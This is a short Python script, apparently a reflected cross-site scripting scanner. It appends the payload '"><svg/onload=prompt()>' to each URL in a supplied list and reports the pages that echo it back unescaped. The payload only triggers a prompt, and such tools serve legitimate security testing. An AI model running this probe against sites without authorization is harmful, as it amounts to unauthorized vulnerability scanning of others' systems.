#!/bin/python3

import requests
import argparse
from colorama import Back, Fore 

parser = argparse.ArgumentParser(description="XSS Scanner")
parser.add_argument('-l', '--list', help="Specify the list of urls that ends with arguments", required=True)
args = parser.parse_args()

urls = open(args.list, 'r')
payload = '"><svg/onload=prompt()>'

def scanner():

    for num,url in enumerate(urls,1):
        final = url+payload
        req = ''
        
        try:
            req = requests.get(final)

            if payload in req.text:
                print(Fore.LIGHTGREEN_EX + "[+] XSS FOUND ---> " + req.url)
            else:
                print(num)

        except:
            print("[-] Error")
            continue

        


scanner()
    